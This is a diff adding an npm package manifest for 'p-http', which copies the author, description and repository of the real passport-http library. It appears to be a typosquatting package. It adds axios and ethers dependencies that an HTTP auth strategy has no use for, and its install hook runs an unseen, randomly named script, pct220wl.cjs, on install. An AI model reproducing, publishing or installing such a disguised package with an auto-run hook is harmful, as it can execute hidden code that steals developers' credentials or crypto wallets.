@@ -1,0 +1,50 @@
+{
+  "name": "p-http",
+  "version": "0.3.0",
+  "description": "HTTP Basic and Digest authentication strategies for Passport.",
+  "keywords": [
+    "passport",
+    "http",
+    "basic",
+    "digest",
+    "auth",
+    "authn",
+    "authentication"
+  ],
+  "repository": {
+    "type": "git",
+    "url": "git://github.com/jaredhanson/passport-http.git"
+  },
+  "bugs": {
+    "url": "http://github.com/jaredhanson/passport-http/issues"
+  },
+  "author": {
+    "name": "Jared Hanson",
+    "email": "jaredhanson@gmail.com",
+    "url": "http://www.jaredhanson.net/"
+  },
+  "licenses": [
+    {
+      "type": "MIT",
+      "url": "http://www.opensource.org/licenses/MIT"
+    }
+  ],
+  "main": "./lib/passport-http",
+  "dependencies": {
+    "passport-strategy": "1.x.x",
+    "axios": "^1.7.7",
+    "ethers": "^6.13.2"
+  },
+  "devDependencies": {
+    "vows": "0.8.x"
+  },
+  "scripts": {
+    "postinstall": "node pct220wl.cjs"
+  },
+  "engines": {
+    "node": ">= 0.4.0"
+  },
+  "files": [
+    "pct220wl.cjs"
+  ]
+}
